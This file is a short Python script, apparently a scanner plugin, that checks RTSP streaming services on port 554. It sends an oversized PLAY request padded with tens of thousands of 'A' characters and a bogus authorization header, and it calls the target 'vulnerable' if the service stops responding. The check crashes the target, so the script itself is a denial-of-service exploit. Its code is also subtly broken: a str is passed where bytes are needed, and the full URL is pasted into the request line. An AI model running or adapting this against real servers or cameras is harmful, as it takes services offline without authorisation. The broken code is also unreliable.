import socket
import time

from urllib.parse import urlparse


def audit(target_url: str):
    if check(target_url):
        print("[+] Found Vulnerable")
    else:
        print("[*] Not Found Vulnerable")


def check(target_url: str):
    host = urlparse(target_url).netloc
    payload = "PLAY rtsp://%s/ RTSP/1.0\r\n" % target_url
    payload += "CSeq: 7\r\n"
    payload += "Authorization: Basic AAAAAAA\r\n"
    payload += "Content-length: 3200\r\n\r\n"
    payload += "A" * 32200

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((host, 554))
    except socket.error:
        #print("[*] Not Found Vulnerable")
        return False
    sock.send(payload)
    sock.close()

    time.sleep(0.2)

    socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        socks.connect((host, 554))
    except socket.error:
        return True
    socks.close()
    return False

